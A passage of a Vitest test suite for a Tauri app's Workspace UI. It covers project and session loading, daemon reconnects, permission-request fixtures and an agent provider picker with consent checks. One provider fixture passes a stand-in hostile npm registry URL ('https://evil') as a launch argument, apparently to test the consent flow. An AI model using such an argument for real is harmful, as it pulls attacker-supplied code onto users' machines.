// @vitest-environment happy-dom

import { act, type ReactNode } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { DaemonStatus, PermissionRequest, Session } from "../../types/ipc";

vi.mock("@tauri-apps/plugin-dialog", () => ({
  // The recovery confirmation dialog; each test that needs a specific answer
  // overrides the resolved value.
  ask: vi.fn(async () => false),
}));

vi.mock("@tauri-apps/api/core", () => ({
  // Presence reporting starts with the Workspace mount; keep its sends
  // hermetic here (presence.test.ts covers the reporter itself).
  invoke: vi.fn(async () => undefined),
}));

vi.mock("../../lib/tauri", () => ({
  daemonStatus: vi.fn(async () => ({
    state: "connected",
    pid: 42,
    instanceId: "daemon-test",
    protocolVersion: 1,
    clients: 1,
    capabilities: ["typed_permissions"],
    message: null,
  })),
  projectsList: vi.fn(),
  projectAdd: vi.fn(),
  workspacesList: vi.fn(),
  workspaceCreate: vi.fn(),
  sessionsList: vi.fn(),
  journalUsage: vi.fn(),
  sessionDelete: vi.fn(),
  reasonFromCause: vi.fn((cause: unknown) =>
    cause instanceof Error && cause.message ? cause.message : "the app did not answer",
  ),
  sessionCreate: vi.fn(),
  providersList: vi.fn(),
  sessionPresence: vi.fn(async () => undefined),
  daemonRestart: vi.fn(async () => undefined),
  sessionPermissionRespond: vi.fn(async () => undefined),
  createSessionStateChannel: vi.fn((onSnapshot: (snapshots: unknown[]) => void) => ({
    onSnapshot,
  })),
  sessionsWatch: vi.fn(async () => undefined),
  sessionsUnwatch: vi.fn(async () => undefined),
  // The session badge's name map: one read per daemon connection. Individual
  // tests override the reply; the default has one paired device to name.
  devicesList: vi.fn(async () => ({ selfInfo: undefined, peers: [], pending: [] })),
}));

vi.mock("../terminal/TerminalSurface", () => ({
  TerminalSurface: ({
    sessionId,
    workspaceId,
    cwd,
  }: {
    sessionId: string;
    workspaceId?: string | null;
    cwd?: string;
  }) => (
    <div data-testid="terminal-surface" data-workspace-id={workspaceId ?? "null"}>
      {sessionId}
      {cwd ? `cwd:${cwd}` : ""}
    </div>
  ),
}));

vi.mock("./AgentChatSurface", () => ({
  AgentChatSurface: ({
    sessionId,
    auxiliary,
    onPermissionRequest,
    onPermissionResolved,
  }: {
    sessionId: string;
    auxiliary?: ReactNode;
    onPermissionRequest?: (
      sessionId: string,
      subscriptionId: number,
      request: PermissionRequest,
    ) => void;
    onPermissionResolved?: (sessionId: string, toolCallId: string) => void;
  }) => (
    <div data-testid="agent-chat-surface">
      {sessionId}
      <div className="workspace-conversation">{auxiliary}</div>
      <div data-testid="mock-composer" />
      <button
        type="button"
        data-testid="emit-permission-a"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            command: "cmd.exe",
            args: ["/c", "echo", "alpha"],
            cwd: "C:\\alpha",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-a-renewed"
        onClick={() =>
          onPermissionRequest?.(sessionId, 42, {
            type: "permission_request",
            toolCallId: "tool-a",
            title: "Run command",
            command: "cmd.exe",
            args: ["/c", "echo", "alpha"],
            cwd: "C:\\alpha",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-b"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "tool-b",
            title: "Run command",
            command: "ping.exe",
            args: ["-n", "1", "127.0.0.1"],
            cwd: "C:\\beta",
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
      <button
        type="button"
        data-testid="emit-permission-resolved"
        onClick={() => onPermissionResolved?.(sessionId, "tool-a")}
      />
      <button
        type="button"
        data-testid="emit-permission-shared"
        onClick={() =>
          onPermissionRequest?.(sessionId, 41, {
            type: "permission_request",
            toolCallId: "shared-tool",
            title: "Run command",
            command: `shared-${sessionId}`,
            cwd: `C:\\${sessionId}`,
            options: [
              { optionId: "allow", name: "Allow once", kind: "allow_once" },
              { optionId: "deny", name: "Deny", kind: "reject_once" },
            ],
          })
        }
      />
    </div>
  ),
}));

import {
  daemonRestart,
  daemonStatus,
  devicesList,
  journalUsage,
  projectAdd,
  projectsList,
  providersList,
  workspaceCreate,
  workspacesList,
  sessionCreate,
  sessionDelete,
  sessionPermissionRespond,
  sessionsList,
  sessionsWatch,
} from "../../lib/tauri";
import { ask } from "@tauri-apps/plugin-dialog";
import type {
  DevicesReply,
  JournalUsage,
  Project,
  Workspace as IpcWorkspace,
} from "../../types/ipc";
import { Workspace, WorkspacePermissionCard } from "./Workspace";
import { SIDE_PANEL_REGISTRY, type SidePanelEntry } from "./sidePanelRegistry";

const terminal = (
  id: string,
  title: string,
  workspaceId: string | null = "workspace-1",
): Session => ({
  id,
  workspaceId,
  kind: "terminal",
  title,
  state: { type: "live", generation: 1 },
  elapsedMs: 0,
});

const acpSession = (id: string, title: string): Session => ({
  ...terminal(id, title),
  kind: "acp",
});

const project: Project = { id: "project-1", name: "devboule", path: "C:\\devboule" };
const workspace: IpcWorkspace = {
  id: "workspace-1",
  projectId: project.id,
  title: "main",
  isolation: "local",
  path: "C:\\devboule",
};
const secondProject: Project = {
  id: "project-2",
  name: "other-project",
  path: "C:\\other-project",
};
const secondWorkspace: IpcWorkspace = {
  id: "workspace-2",
  projectId: secondProject.id,
  title: "other-main",
  isolation: "local",
  path: "C:\\other-project",
};
const createdWorkspace: IpcWorkspace = {
  id: "workspace-created",
  projectId: project.id,
  title: "new-workspace",
  isolation: "local",
  path: "C:\\devboule",
};

const daemonConnected: DaemonStatus = {
  state: "connected",
  pid: 42,
  instanceId: "daemon-test",
  protocolVersion: 1,
  clients: 1,
  capabilities: ["typed_permissions"],
  message: null,
};

const daemonDisconnected: DaemonStatus = {
  state: "disconnected",
  pid: null,
  instanceId: null,
  protocolVersion: null,
  clients: null,
  capabilities: [],
  message: "daemon unreachable",
};

const devicesReply: DevicesReply = {
  selfInfo: {
    deviceId: "device-self",
    displayName: "This laptop",
    publicKey: "cHVibGljLWtleQ==",
    keyFingerprint: "0a1b2c3d4e5f60718293a4b5c6d7e8f9",
    addresses: ["100.64.0.1"],
    port: 47831,
    daemonVersion: "0.1.0",
    protocolVersion: 1,
    remote: { state: "enabled", reason: null },
  },
  peers: [
    {
      deviceId: "device-phone",
      displayName: "Xiaomi 14",
      role: "client",
      publicKey: "cHVibGljLWtleQ==",
      keyFingerprint: "f9e8d7c6b5a4938271605f4e3d2c1b0a",
      bindingKind: "tailnet",
      bindingNodeName: "xiaomi-14.tail80a42d.ts.net.",
      bindingLoginName: "user@example.com",
      address: "100.74.116.126:47831",
      pairedAt: 1_760_000_000_000,
      revokedAt: null,
      caps: ["view", "send"],
      pairedByUser: null,
      online: true,
    },
  ],
  pending: [],
};

const permissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-test",
  title: "Run command",
  command: "echo test",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const spawnPermissionRequest: PermissionRequest = {
  type: "permission_request",
  toolCallId: "tool-spawn",
  title: "Run command",
  command: "cmd.exe",
  args: ["/c", "echo", "gated"],
  cwd: "C:\\work\\tree",
  options: [
    { optionId: "allow", name: "Allow once", kind: "allow_once" },
    { optionId: "deny", name: "Deny", kind: "reject_once" },
  ],
};

const historyUsage: JournalUsage = {
  totalBytes: 32,
  sessionCount: 1,
  deletedByUser: 0,
  deletedByRetention: 0,
  unreclaimable: { bytesOver: 0, sessionsOver: 0, agedOut: 0 },
  limits: {
    snapshotEveryBytes: 65_536,
    sessionMaxBytes: 512,
    maxBytes: 1024,
    maxSessions: 10,
    maxAgeMs: 0,
  },
  perSession: [
    { id: "session-1", title: "Saved build history", kind: "terminal", bytes: 32, updatedAtMs: 0 },
  ],
};

function setSearchValue(input: HTMLInputElement, value: string) {
  const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")?.set;
  if (!setter) throw new Error("input value setter did not resolve");
  setter.call(input, value);
  input.dispatchEvent(new Event("input", { bubbles: true }));
}

describe("Workspace sessions", () => {
  let container: HTMLDivElement;
  let root: ReturnType<typeof createRoot>;

  beforeEach(() => {
    container = document.createElement("div");
    document.body.appendChild(container);
    vi.mocked(projectsList).mockResolvedValue([project]);
    vi.mocked(workspacesList).mockResolvedValue([workspace]);
    vi.mocked(workspaceCreate).mockResolvedValue(createdWorkspace);
    vi.mocked(sessionsList).mockResolvedValue([terminal("session-1", "shell one")]);
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-2", "agent two"),
      kind: "acp",
    });
    vi.mocked(providersList).mockResolvedValue({ providers: [], unreadableDirs: 0 });
    vi.mocked(devicesList).mockResolvedValue(devicesReply);
    // The factory default already says "connected", but a nested describe's
    // override survives `clearAllMocks`, so pin it here for every test.
    vi.mocked(daemonStatus).mockResolvedValue(daemonConnected);
  });

  afterEach(async () => {
    await act(async () => root.unmount());
    container.remove();
    vi.clearAllMocks();
  });

  it("loads daemon projects and workspaces and derives workspace facts from live sessions", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      terminal("live-session", "live shell", "workspace-1"),
      {
        ...terminal("ended-session", "ended shell", "workspace-1"),
        state: { type: "ended", generation: 1, code: 0, integrity: { kind: "complete" } },
      },
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    // Projects load exactly once — from the daemon's connected transition,
    // with no duplicate mount load.
    expect(projectsList).toHaveBeenCalledTimes(1);
    expect(workspacesList).toHaveBeenCalledWith(project.id);
    const row = container.querySelector<HTMLButtonElement>(
      "button[aria-pressed='true'].workspace-row",
    );
    expect(row?.textContent).toContain("1 live session · local");
    expect(row?.textContent).not.toContain("dirty");
    expect(row?.title).toBe("C:\\devboule");
  });

  it("renders and selects an extra panel supplied through the registry", async () => {
    const extraPanel: SidePanelEntry = {
      id: "plugin-panel-test",
      name: "Plugin panel",
      meta: "test",
      dotTone: "green",
      render: () => <div data-testid="plugin-panel">Plugin panel content</div>,
    };
    const registry: SidePanelEntry[] = [...SIDE_PANEL_REGISTRY, extraPanel];

    root = createRoot(container);
    await act(async () => root.render(<Workspace sidePanelRegistry={registry} />));
    await act(async () => undefined);

    const selector = container.querySelector<HTMLButtonElement>(".workspace-surface-selector");
    if (selector === null) throw new Error("side panel selector did not render");
    await act(async () => selector.click());
    const option = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("Plugin panel"));
    if (option === undefined) throw new Error("extra registry panel did not render");
    await act(async () => option.click());

    expect(container.querySelector("[data-testid=plugin-panel]")?.textContent).toBe(
      "Plugin panel content",
    );

    await act(async () => selector.click());
    const selectedOption = Array.from(
      container.querySelectorAll<HTMLButtonElement>(".workspace-surface-option"),
    ).find((button) => button.textContent?.includes("Plugin panel"));
    expect(selectedOption?.getAttribute("aria-selected")).toBe("true");
  });

  it("renders the first registry entry for an unknown active panel without selecting it", async () => {
    const fallbackPanel: SidePanelEntry = {
      id: "only-available-panel",
      name: "Available panel",
      meta: "test",
      dotTone: "green",
      render: () => <div data-testid="fallback-panel">Fallback content</div>,
    };

    root = createRoot(container);
    await act(async () => root.render(<Workspace sidePanelRegistry={[fallbackPanel]} />));
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=fallback-panel]")?.textContent).toBe(
      "Fallback content",
    );
    const selector = container.querySelector<HTMLButtonElement>(".workspace-surface-selector");
    if (selector === null) throw new Error("side panel selector did not render");
    await act(async () => selector.click());

    const option = container.querySelector<HTMLButtonElement>(".workspace-surface-option");
    if (option === null) throw new Error("fallback panel option did not render");
    expect(option.getAttribute("aria-selected")).toBe("false");
  });

  it("exposes the checkout path on hover and omits it when the daemon sent none", async () => {
    const worktreeWorkspace: IpcWorkspace = {
      id: "workspace-worktree",
      projectId: project.id,
      title: "feature-x",
      isolation: "worktree",
      path: "C:\\devboule.worktrees\\feature-x-9f2e1a",
    };
    const bareWorkspace: IpcWorkspace = {
      id: "workspace-bare",
      projectId: project.id,
      title: "no-path",
      isolation: "local",
      path: "",
    };
    vi.mocked(workspacesList).mockResolvedValue([worktreeWorkspace, bareWorkspace]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const rows = container.querySelectorAll<HTMLButtonElement>("button.workspace-row");
    expect(rows.length).toBe(2);
    expect(rows[0]?.title).toBe("C:\\devboule.worktrees\\feature-x-9f2e1a");
    expect(rows[0]?.textContent).not.toContain("C:\\devboule.worktrees\\feature-x-9f2e1a");
    expect(rows[1]?.title).toBe("");
  });

  it("keeps the project-load failure visible on a connected daemon until the user retries", async () => {
    // With no mount load there is no pre-connection call to fail; the honest
    // failure case is a connected daemon whose projectsList rejects. The
    // error must stay up (no silent retry loop) with the retry in the
    // user's hands.
    vi.mocked(projectsList).mockRejectedValueOnce(new Error("journal is unavailable"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "journal is unavailable",
    );
    expect(projectsList).toHaveBeenCalledTimes(1);
    expect(container.textContent).not.toContain("No matching workspaces");

    // Still failing, still shown: nothing reloaded behind the user's back.
    await act(async () => undefined);
    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "journal is unavailable",
    );
    expect(projectsList).toHaveBeenCalledTimes(1);
  });

  it("clears the project-load error when the daemon disconnects and reconnects", async () => {
    // The daemon hook polls every 2 s, so the disconnect/reconnect ticks are
    // driven by fake timers instead of real waits.
    vi.useFakeTimers();
    try {
      let answerFirst!: (status: DaemonStatus) => void;
      let answerSecond!: (status: DaemonStatus) => void;
      let answerThird!: (status: DaemonStatus) => void;
      vi.mocked(daemonStatus)
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerFirst = resolve;
            }),
        )
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerSecond = resolve;
            }),
        )
        .mockImplementationOnce(
          () =>
            new Promise((resolve) => {
              answerThird = resolve;
            }),
        );
      vi.mocked(projectsList).mockRejectedValueOnce(new Error("journal is unavailable"));
      root = createRoot(container);
      await act(async () => root.render(<Workspace />));
      await act(async () => answerFirst(daemonConnected));
      await act(async () => undefined);

      // The first connected load failed; only the user or a fresh connected
      // transition may clear the error.
      expect(container.querySelector('[role="alert"]')?.textContent).toContain(
        "journal is unavailable",
      );
      expect(projectsList).toHaveBeenCalledTimes(1);

      await act(async () => {
        vi.advanceTimersByTime(2_000);
      });
      await act(async () => answerSecond(daemonDisconnected));
      await act(async () => undefined);
      await act(async () => {
        vi.advanceTimersByTime(2_000);
      });
      await act(async () => answerThird(daemonConnected));
      await act(async () => undefined);

      // The reconnect transition reloaded through the same load path and the
      // successful load cleared the error.
      expect(projectsList).toHaveBeenCalledTimes(2);
      expect(container.querySelector('[role="alert"]')).toBeNull();
      expect(container.textContent).toContain("main");
    } finally {
      vi.useRealTimers();
    }
  });

  it("reloads sessions and revives the watch when the daemon becomes connected", async () => {
    let answerDaemon!: (status: DaemonStatus) => void;
    vi.mocked(daemonStatus).mockImplementationOnce(
      () =>
        new Promise((resolve) => {
          answerDaemon = resolve;
        }),
    );
    vi.mocked(sessionsList).mockRejectedValueOnce(new Error("pipe not open"));
    vi.mocked(sessionsWatch).mockRejectedValueOnce(new Error("pipe not open"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.textContent).toContain("Could not load sessions");
    expect(container.querySelector("[data-testid=terminal-surface]")).toBeNull();

    await act(async () => answerDaemon(daemonConnected));
    await act(async () => undefined);

    expect(sessionsList).toHaveBeenCalledTimes(2);
    expect(sessionsWatch).toHaveBeenCalledTimes(2);
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toContain(
      "session-1",
    );
    expect(container.textContent).not.toContain("Could not load sessions");
  });

  it("keeps recovered journal sessions out of the tab strip but renders a live one", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      {
        ...terminal("recovered-1", "recovered agent"),
        state: {
          type: "recovered",
          generation: 3,
          integrity: { kind: "unverifiable", droppedFrames: 0, droppedBytes: 0, trimmedBytes: 0 },
        },
      },
      terminal("live-1", "running agent"),
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const tabs = [...container.querySelectorAll(".workspace-session-tab")];
    expect(tabs.map((tab) => tab.textContent)).toEqual([expect.stringContaining("running agent")]);
    expect(container.textContent).not.toContain("recovered · unverifiable");
    // Selection stays on the visible tab instead of a hidden one.
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toBe("live-1");
  });

  it("keeps healthy projects visible, marks a failed project, and retries its load", async () => {
    vi.mocked(projectsList).mockResolvedValue([project, secondProject]);
    vi.mocked(workspacesList).mockImplementation(async (projectId) => {
      if (projectId === secondProject.id) throw new Error("workspace journal busy");
      return [workspace];
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.textContent).toContain("devboule");
    expect(container.textContent).toContain("other-project");
    expect(container.textContent).toContain("workspace journal busy");
    expect(container.textContent).not.toContain("No matching workspaces");

    const search = container.querySelector<HTMLInputElement>('input[placeholder="Search"]');
    if (search === null) throw new Error("workspace search did not render");
    await act(async () => setSearchValue(search, "does-not-match"));
    expect(container.textContent).toContain("workspace journal busy");
    expect(container.textContent).toContain("Retry");
    await act(async () => setSearchValue(search, ""));

    vi.mocked(workspacesList).mockResolvedValue([secondWorkspace]);
    const retry = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent === "Retry",
    );
    if (retry === undefined) throw new Error("project retry control did not render");
    await act(async () => retry.click());
    await act(async () => undefined);

    expect(container.textContent).not.toContain("workspace journal busy");
    expect(container.textContent).toContain("other-main");
  });

  it("reconciles a project created while the initial project load is pending", async () => {
    const createdProject: Project = {
      id: "project-created-during-load",
      name: "created-during-load",
      path: "C:\\created-during-load",
    };
    const createdWorkspaceDuringLoad: IpcWorkspace = {
      id: "workspace-created-during-load",
      projectId: createdProject.id,
      title: "created-main",
      isolation: "local",
      path: "C:\\created-during-load",
    };
    let releaseInitialWorkspaces: ((value: IpcWorkspace[]) => void) | undefined;
    const initialWorkspaces = new Promise<IpcWorkspace[]>((resolve) => {
      releaseInitialWorkspaces = resolve;
    });
    vi.mocked(projectsList).mockResolvedValue([project]);
    vi.mocked(workspacesList).mockImplementation((projectId) =>
      projectId === project.id ? initialWorkspaces : Promise.resolve([createdWorkspaceDuringLoad]),
    );
    vi.mocked(projectAdd).mockResolvedValue(createdProject);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newProject = container.querySelector<HTMLButtonElement>('[aria-label="New project"]');
    if (newProject === null) throw new Error("new project control did not render");
    await act(async () => newProject.click());
    const input = container.querySelector<HTMLInputElement>("#workspace-project-input");
    if (input === null) throw new Error("project input did not render");
    setSearchValue(input, "C:\\created-during-load");
    const submit = Array.from(container.querySelectorAll<HTMLButtonElement>("button")).find(
      (button) => button.textContent === "Add project",
    );
    if (submit === undefined) throw new Error("project submit control did not render");
    await act(async () => submit.click());
    await act(async () => undefined);

    await act(async () => {
      if (releaseInitialWorkspaces === undefined) throw new Error("initial load was not pending");
      releaseInitialWorkspaces([workspace]);
    });
    await act(async () => undefined);

    expect(container.textContent).toContain("created-during-load");
    expect(container.textContent).toContain("created-main");
  });

  it("renders real session tabs, creates an ACP session, and never renders the permission card", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    expect(container.textContent).toContain("shell one");
    expect(container.querySelector(".permission-card")).toBeNull();
    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toBe(
      "session-1",
    );
    expect(
      container.querySelector<HTMLElement>("[data-testid=terminal-surface]")?.dataset.workspaceId,
    ).toBe("workspace-1");

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    // Flush the async provider-choice chain (chooseProvider → providersList →
    // sessionCreate) deliberately instead of trusting act's incidental
    // microtask draining.
    await act(async () => {});

    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "acp");
    expect(container.textContent).toContain("agent two");
    expect(container.querySelector("[data-testid=agent-chat-surface]")?.textContent).toBe(
      "session-2",
    );
  });

  it("renders the create error as a dismissible alert while a session is selected", async () => {
    vi.mocked(sessionCreate).mockRejectedValue(new Error("Authentication required: test-reason"));
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=terminal-surface]")).not.toBeNull();
    const banner = container.querySelector('[role="alert"]');
    if (banner === null) throw new Error("error banner did not render");
    expect(banner.textContent).toContain("Authentication required: test-reason");
    expect(container.textContent).not.toContain("unreachable");

    const dismiss = banner.querySelector<HTMLButtonElement>('[aria-label="Dismiss error"]');
    if (dismiss === null) throw new Error("dismiss control did not render");
    await act(async () => dismiss.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')).toBeNull();
  });

  it("renders the daemon echoed cwd in the terminal header input", async () => {
    vi.mocked(sessionsList).mockResolvedValue([
      { ...terminal("session-cwd", "shell"), cwd: "C:\\real\\workspace" },
    ]);
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    expect(container.querySelector("[data-testid=terminal-surface]")?.textContent).toContain(
      "cwd:C:\\real\\workspace",
    );
  });

  it("starts an ACP session when a new workspace is added", async () => {
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());

    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp");
    expect(container.querySelector("[data-testid=agent-chat-surface]")).not.toBeNull();
  });

  it("shows a workspace creation error without falling back or creating a session", async () => {
    vi.mocked(workspaceCreate).mockRejectedValueOnce(
      new Error("worktree isolation is unimplemented"),
    );
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "worktree isolation is unimplemented",
    );
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  const grokProvider = {
    id: "grok",
    executable: "grok.exe",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp",
  };
  const claudeProvider = {
    id: "claude",
    executable: "claude.exe",
    acpAvailable: false,
    authentication: "unknown" as const,
    protocol: "stream-json",
  };
  const npxProvider = {
    id: "codex-acp",
    executable: "@agentclientprotocol/codex-acp@1.10.0",
    acpAvailable: true,
    authentication: "unknown" as const,
    protocol: "acp" as const,
    origin: "npx-wrapper" as const,
    launchArgs: ["--registry=https://evil"],
  };

  it("lists chat-capable providers in a popover and creates claude when chosen", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-claude", "Agent"),
      kind: "claude",
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(sessionCreate).not.toHaveBeenCalled();
    const menu = container.querySelector('[aria-label="Choose agent"]');
    if (menu === null) throw new Error("provider popover did not render");
    expect(menu.textContent).toContain("grok");
    expect(menu.textContent).toContain("claude");
    const groups = menu.querySelectorAll(".workspace-provider-group");
    expect(groups).toHaveLength(1);
    expect(groups[0].textContent).toContain("Installed");

    const claudeOption = Array.from(menu.querySelectorAll("button")).find(
      (button) => button.textContent === "claude",
    );
    if (claudeOption === undefined) throw new Error("claude option did not render");
    await act(async () => claudeOption.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "claude");
    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
  });

  it("creates immediately with the only chat-capable provider", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "grok");
  });

  it("requires consent for the only npx provider before creating a session", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [npxProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
    expect(sessionCreate).not.toHaveBeenCalled();

    const confirm = container.querySelector<HTMLButtonElement>(".workspace-primary-action");
    if (confirm === null) throw new Error("Confirm button did not render");
    await act(async () => confirm.click());
    await act(async () => undefined);

    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp", "codex-acp");
  });

  it("surfaces a provider-list failure without creating a workspace or session", async () => {
    vi.mocked(providersList).mockRejectedValueOnce(new Error("provider catalog unavailable"));
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[role="alert"]')?.textContent).toContain(
      "provider catalog unavailable",
    );
    expect(workspaceCreate).not.toHaveBeenCalled();
    expect(sessionCreate).not.toHaveBeenCalled();
  });

  it("creates an ACP session with no provider when no chat-capable CLI is installed", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [
        {
          id: "codex",
          executable: "codex.exe",
          acpAvailable: false,
          authentication: "unknown",
          protocol: null,
        },
      ],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => {
      root.render(<Workspace />);
    });
    await act(async () => undefined);

    const newWorkspace = container.querySelector<HTMLButtonElement>(".workspace-new-row");
    if (newWorkspace === null) throw new Error("new workspace control did not render");
    await act(async () => newWorkspace.click());
    await act(async () => undefined);

    expect(container.querySelector('[aria-label="Choose agent"]')).toBeNull();
    expect(sessionCreate).toHaveBeenCalledWith("workspace-created", "acp");
  });

  it("offers the provider picker from the + button and passes the chosen provider to sessionCreate", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [grokProvider, claudeProvider],
      unreadableDirs: 0,
    });
    vi.mocked(sessionCreate).mockResolvedValue({
      ...terminal("session-claude", "Agent"),
      kind: "claude",
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const menu = container.querySelector('[aria-label="Choose agent"]');
    if (menu === null) throw new Error("provider popover did not render");
    const claudeOption = Array.from(menu.querySelectorAll("button")).find(
      (button) => button.textContent === "claude",
    );
    if (claudeOption === undefined) throw new Error("claude option did not render");
    await act(async () => claudeOption.click());
    await act(async () => undefined);

    // The + button creates a session in the selected workspace, never a workspace.
    expect(sessionCreate).toHaveBeenCalledWith("workspace-1", "claude");
    expect(workspaceCreate).not.toHaveBeenCalled();
  });

  it("splits the provider picker into installed and available-to-install groups", async () => {
    vi.mocked(providersList).mockResolvedValue({
      providers: [npxProvider, claudeProvider, grokProvider],
      unreadableDirs: 0,
    });
    root = createRoot(container);
    await act(async () => root.render(<Workspace />));
    await act(async () => undefined);

    const add = container.querySelector<HTMLButtonElement>(".workspace-session-add");
    if (add === null) throw new Error("session add control did not render");
    await act(async () => add.click());
    await act(async () => undefined);

    const menu = container.querySelector('[aria-label="Choose agent"]');
    if (menu === null) throw new Error("provider popover did not render");
    const groups = menu.querySelectorAll(".workspace-provider-group");
    expect(groups).toHaveLength(2);
    expect(groups[0].textContent).toContain("Installed");
    expect(groups[0].textContent).toContain("grok");
    expect(groups[0].textContent).toContain("claude");
    expect(groups[0].textContent).not.toContain("codex-acp");
    expect(groups[1].textContent).toContain("Available to install");
    expect(groups[1].textContent).toContain("codex-acp");

    // Choosing a registry agent still routes through the consent flow.
    const npxOption = Array.from(groups[1].querySelectorAll("button")).find(
      (button) => button.textContent === "codex-acp",
    );
    if (npxOption === undefined) throw new Error("npx option did not render");
    await act(async () => npxOption.click());
    await act(async () => undefined);

    expect(sessionCreate).not.toHaveBeenCalled();
    expect(container.querySelector('[aria-label="Confirm agent"]')).not.toBeNull();
  });

